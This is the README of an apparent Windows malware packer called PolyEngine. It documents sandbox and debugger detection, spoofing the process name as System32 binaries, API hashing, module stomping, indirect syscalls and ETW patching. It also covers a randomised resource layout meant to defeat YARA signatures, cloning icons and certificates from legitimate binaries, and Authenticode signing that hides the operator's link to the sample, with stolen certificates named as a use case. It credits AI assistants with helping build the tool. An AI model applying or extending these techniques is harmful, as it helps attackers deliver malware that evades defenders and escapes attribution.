- `PEB.ImageBaseFileName` — process name shown by Process Hacker, etc.
- `PEB.ImagePathName` and `PEB.CommandLine` — full path visible in process listings
- `PEB.BeingDebugged = 0`, `PEB.NtGlobalFlag = 0` — anti-debug flags
- `ProcessHeap.Flags = 2`, `ProcessHeap.ForceFlags = 0` — heap debug flags

The spoof filename is set via `--spoof-name`. If omitted, Builder picks randomly from a pool of 9 common System32 processes (`RuntimeBroker.exe`, `SgrmBroker.exe`, `WmiPrvSE.exe`, `SearchIndexer.exe`, `taskhostw.exe`, `spoolsv.exe`, `wlrmdr.exe`, `WMPDMC.exe`, `hvix64.exe`) using `CryptGenRandom`.

</details>

<details>
<summary><b>Sandbox & Anti-Analysis Checks</b></summary>

`Evasion_RunChecks()` runs before any syscall initialization and uses only the Win32 API layer. Checks are individually toggleable via `--disable`.

**Hard checks** — a single positive triggers immediate exit:

| Check | Method | What it detects |
|---|---|---|
| `debugger` | `PEB.BeingDebugged`, `PEB.NtGlobalFlag`, `ProcessHeap` flags, `NtQueryInformationProcess(ProcessDebugPort)` | Win32 debugger attached |
| `api-emu` | `RtlComputeCrc32(seed, NULL, 0)` — must equal seed | API emulation that returns wrong results |
| `exec-ctrl` | Named semaphore (`wuauctl` by default, configurable) — `ERROR_ALREADY_EXISTS` | Second execution of the sample |
| `sleep-fwd` | `Sleep(ms)` + `GetTickCount64` delta, threshold = 90% of `ms` | Sandbox that fast-forwards `Sleep` calls |

**Soft checks** — 2 or more positives required to exit (reduces false positives):

| Check | Threshold | What it detects |
|---|---|---|
| `uptime` | system uptime < N minutes (default: 2) | Freshly spawned sandbox VM |
| `cpu` | logical processor count < 2 | Low-spec sandbox |
| `screen` | screen width ≤ 1024 px | 800×600 / 1024×768 sandbox resolutions |
| `files` | `HKCU\...\Explorer\RecentDocs` subkey count < 5 | Clean / fake user profile |

**Timing delay:**

`Evasion_HammerDelay()` burns real wall-clock time via `VirtualAlloc/VirtualFree` pairs timed by `GetTickCount64`. The duration is configurable via `--hammer-s` (default: 3 seconds). Sandbox time-accelerators cannot fast-forward allocator round-trips, making this effective against sleep-fast-forward evasion that bypasses the `sleep-fwd` check.

</details>

<details>
<summary><b>API Hashing — Djb2</b></summary>

All Windows API names are replaced at compile time with precomputed Djb2 hashes stored as `g_Hash_*` globals. `GetProcAddressH()` walks the export directory and hashes each exported name until a match is found — no plaintext API string appears in the import table or `.data`.

</details>

<details>
<summary><b>Identity cloning — <code>--clone-meta</code></b></summary>

Optional Phase 11 post-build step that copies three cosmetic attributes from a donor PE into the already-built output. Runs after `BuildInfectedPE` (which rewrites `.rsrc` entirely — anything written earlier would be lost) and before `SignPeWithPfx` (which overwrites the cert directory with a real signature if `--pfx` is also given).

**`CloneMeta_CopyResources`** loads the donor as a flat data file (`LOAD_LIBRARY_AS_DATAFILE` — deliberately *without* `LOAD_LIBRARY_AS_IMAGE_RESOURCE`, which activates MUI resource redirection on system files and routes `RT_GROUP_ICON` lookups to a language satellite `.mui` that contains no icons). `RT_VERSION` is enumerated via `EnumResourceLanguagesA` to collect all language IDs; each variant is written with `UpdateResourceA`. For `RT_GROUP_ICON`, the lowest integer-ID group is selected (the one Explorer uses for the shell icon by convention). `FindResourceA` is not used for the actual data lookup — it fails with `ERROR_RESOURCE_NAME_NOT_FOUND` (1813) on `LOAD_LIBRARY_AS_DATAFILE` handles even for resources that `EnumResourceNamesA` just found, because the `LANG_NEUTRAL` fallback path is broken in datafile mode. Instead, `EnumResourceLanguagesA` extracts the exact `LANGID` stored in the donor, then `FindResourceExA` uses it directly. All `UpdateResourceA` calls open the output PE with `BeginUpdateResourceA(FALSE)` — the merge flag preserves the existing `.rsrc` payload entry from Phase 10.

**`CloneMeta_CopyCertDirectory`** reads the donor into a flat buffer via `ReadFileToBuffer`, parses the DOS → NT headers (supporting both x86 and x64 donors via `OptionalHeader.Magic` dispatch), and extracts `DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY]`. That directory entry uses a **file offset** (not an RVA) — it is the only PE data directory where `VirtualAddress` is a raw byte offset into the file. The cert blob is appended at 8-byte-aligned EOF (WIN_CERTIFICATE alignment requirement), the target's SECURITY directory entry is patched in-place, then `MapFileAndCheckSumA` (from `imagehlp.lib`) recomputes the PE checksum. The write handle is **closed before calling `MapFileAndCheckSumA`** — `MapFileAndCheckSumA` opens its own internal handle and would fail with a sharing violation if the caller holds an exclusive write handle — then re-opened briefly to write just the 4-byte checksum at the computed file offset.

</details>

<details>
<summary><b>Authenticode signing — <code>--pfx</code></b></summary>

Optional post-build step. When `--pfx` is supplied, Builder signs the packed output via `mssign32!SignerSignEx2` (resolved at runtime — no link-time `mssign32` dependency, no `signtool.exe` on the operator workstation). Signing runs as Phase 9 after `BuildInfectedPE` returns, because writing the signature rewrites `IMAGE_DIRECTORY_ENTRY_SECURITY` and recalculates the PE checksum; any later resource edit would invalidate the signature.

The PFX is imported with `PKCS12_NO_PERSIST_KEY | PKCS12_PREFER_CNG_KSP | PKCS12_INCLUDE_EXTENDED_PROPERTIES`. `NO_PERSIST_KEY` keeps the private key resident in memory only — no key container file written under `%APPDATA%\Microsoft\Crypto`, which would otherwise tie the operator's workstation to the signed sample. `PREFER_CNG_KSP` is required for modern PFXs (PowerShell `New-SelfSignedCertificate`, OpenSSL ≥3.x); without it `SignerSignEx2` fails with `NTE_BAD_TYPE` (`0x8009000A`). Digest is SHA-256.

`--ts-url` is opt-in. RFC 3161 timestamping sends an HTTP request to the timestamp authority, which logs the requester IP plus the signing moment, and embeds that moment into the signature blob inside the PE. Skip the flag for fully air-gappable signing; use it only when the signature must outlive the cert's lifetime (e.g. stolen / short-lived code-signing certs that will be revoked).

</details>

---

## .rsrc Metadata Block Layout

Resource payload is **not** fixed at ID 101. At pack time Builder:

1. Draws a `WORD` RT_RCDATA ID via `CryptGenRandom` in range `0x0100..0x7EFF`
2. Patches LE bytes at `g_PayloadResIdMarker[4..5]` in the loader stub (tag `{0xB1,0x0B,0x1D,0xE0}` in `Payload.c`; unpatched default = 101)
3. Runs `StubMorph_Apply` on the stub image
4. Writes `UpdateResource(RT_RCDATA, id)` = `[XTEA-encrypted blob | PAYLOAD_METADATA (280 bytes)]`

At runtime Stub reads the marker and calls `FindResourceW` with that ID. The metadata block is located by scanning backwards from the end of the resource (up to 128 bytes, tolerating `UpdateResource` alignment padding) and verifying `magic == XOR(key_salt[0..3])`.

<details>
<summary>Field-by-field layout</summary>

```
[XTEA-encrypted blob]
[key_salt        : 16 bytes]  per-build random XTEA salt (4 x DWORD)
[dll_idx0        :  1 byte ]  index into g_DllPool (module stomping target 1)
[dll_idx1        :  1 byte ]  index into g_DllPool (module stomping target 2)
[dll_idx2        :  1 byte ]  index into g_DllPool (module stomping target 3)
[pad             :  1 byte ]  alignment (0x00)
[origSize        :  4 bytes]  original decompressed PE size (ULONG)
[stubSize        :  4 bytes]  mutated ASM decryptor size (DWORD)
[blobSize        :  4 bytes]  XTEA blob size (DWORD)
[exportHash      :  4 bytes]  Djb2(exportName, key_salt[0]); 0 = none
[exportArg       : 128 bytes] null-terminated export argument string (zero-padded)
[spoof_exe       :  64 bytes] ASCII filename for PEB spoof (zero-padded)
[semaphore_name  :  32 bytes] exec-ctrl semaphore name; empty = default "wuauctl" (zero-padded)
[sleep_fwd_ms    :  4 bytes]  sleep-fwd check duration (ms); 0 = default 500
[uptime_min      :  4 bytes]  uptime threshold (minutes); 0 = default 2
[hammer_ms       :  4 bytes]  API-hammer delay (ms); 0 = default 3000
[flags           :  4 bytes]  OPSEC_FLAG_* + EVASION_FLAG_* + PAYLOAD_FLAG_* bitmask
[magic           :  4 bytes]  key_salt[0]^key_salt[1]^key_salt[2]^key_salt[3]
──────────────────────────────
Total: 280 bytes  (kMagicOffset = 276)
```

`flags` bits (see `Engine/OpsecFlags.h`): OPSEC 0–5, evasion/unhook 6–16, `PAYLOAD_FLAG_IS_SHELLCODE` (17).

No fixed value exists anywhere in the block — every field is either random (key_salt, magic) or build-specific. The RT_RCDATA ID is also per-build. YARA cannot anchor on a static byte sequence or a fixed resource ID.

**Loader exit codes (Release):** all loader failure paths exit with code `0` via `LOADER_EXIT` (`Stub/Common.h`). Debug builds keep distinct codes for step diagnosis. Evasion detections already exit 0.

</details>

---

## Module Stomping DLL Pool

Builder `--preset` selects 3 DLL indices stored in `.rsrc`. Stub resolves names from `g_DllPool` at runtime — no DLL name appears in the payload or metadata.

<details>
<summary>DLL pool table</summary>

| Index | DLL | Group |
|---|---|---|
| 0 | xpsservices.dll | PRINT |
| 1 | msi.dll | PRINT |
| 2 | dbghelp.dll | PRINT |
| 3 | winmm.dll | MEDIA |
| 4 | dxgi.dll | MEDIA |
| 5 | oleaut32.dll | MEDIA |
| 6 | winhttp.dll | NETWORK |
| 7 | wtsapi32.dll | NETWORK |
| 8 | wlanapi.dll | NETWORK |
| 9 | bcrypt.dll | (RANDOM-only) |

Index 9 (`bcrypt.dll`) is reachable only via `--preset RANDOM`; the named presets cover indices 0–8 in groups of three. Builder verifies at build time that at least one of the three selected DLLs has an executable section large enough for the payload blob, and warns if none qualify.

</details>

---

## Project Structure

<details>
<summary>File tree</summary>

```
PolyEngine/
├── Builder/                 — packer CLI (links selected Engine units)
│   ├── Builder.cpp          — CLI, ResolveStubPath (stub_v* pool), pipeline orchestration
│   ├── CloneMeta.cpp/h      — VERSIONINFO + icon + cert directory (--clone-meta)
│   ├── PeSigning.cpp/h      — Authenticode via mssign32!SignerSignEx2 (--pfx)
│   └── UacManifest.cpp/h    — RT_MANIFEST requireAdministrator (--uac)
├── Engine/                  — shared sources (subset linked into Builder and/or Stub)
│   ├── Compression.c/h      — LZNT1 compress (Builder) / decompress helpers
│   ├── Crypto.c/h           — CompoundEncrypt inner cipher (XOR+ROL+ADD+XOR)
│   ├── DecryptorStub.asm    — 34-byte polymorphic decryptor template
│   ├── MutationEngine.c/h   — per-build ASM decryptor mutation (Builder)
│   ├── NtApi.c/h            — NT API pointer table (Stub binds via HellsHall)
│   ├── OpsecFlags.h         — OPSEC_FLAG_* + EVASION_FLAG_* + PAYLOAD_FLAG_* bits
│   ├── PeBuilder.c/h        — PAYLOAD_METADATA (280 B) + .rsrc inject + marker patches
│   ├── StubMorph.c/h        — pack-time PE morph + POLY island NOP rewrite (Builder only)
│   ├── RunPE.c/h            — in-process PE map (IAT, relocs, DllMain / EXE EP)
│   └── Xtea.c/h             — XTEA-CTR + irrational-constant key derivation
└── Stub/                    — CRT-free runtime; Release|x64 → stub_v0.bin .. stub_v3.bin
    ├── Stub.cpp             — EntryPoint → Loader_* phases; POLY_VARIANT OPSEC order
    ├── PolyIslands.c        — marker-bracketed NOP pads + per-variant decoy blob
    ├── ApiHashing.cpp/h     — Djb2 hash cache, GetProcAddressH, GetModuleHandleH
    ├── Common.c/h           — custom_memcpy/memset/memcmp; LOADER_EXIT (Release→0)
    ├── Evasion.cpp/h        — HammerDelay + RunChecks (sandbox / debugger)
    ├── HellsHall.asm        — indirect syscall + Moonwalk RSP pivot (deny-list / shared)
    ├── ModuleStomping.c/h   — ModuleStomp_Alloc / ModuleOverload_Alloc
    ├── Opsec.c/h            — ETW patch, PEB spoof
    ├── Payload.c/h          — g_PayloadResIdMarker, GetPayloadFromResource, decompress
    ├── StubNtApi.c          — Sys_Nt* wrappers → HellsHall
    ├── Structs.h            — NT structs (no DDK)
    ├── Syscalls.c/h         — FreshyCalls SSN sort, syscall;ret trampoline in ntdll .text
    ├── TlsCallback.c        — pre-EP anti-debug + TLS guard marker
    ├── Unhooker.c/h         — optional \KnownDlls\ .text restore (--unhook)
    └── StackSpoof.c/h       — gadget pool + per-call synthetic stack configs
```

</details>

---

## Dependencies

- Windows 10/11 x64 target
- Visual Studio 2022 (MSVC v143) — no external libraries
- Stub: zero CRT dependency (`/NODEFAULTLIB`), no `malloc`/`free`, no `<string.h>`

---

**Maintained by: Razz** | Built for opsec-conscious security research and fun

*Assistance in implementation done with Claude Code, Grok and DeepSeek*

---

## License

[MIT](LICENSE) — authorized use only. See `LICENSE` for the full disclaimer.
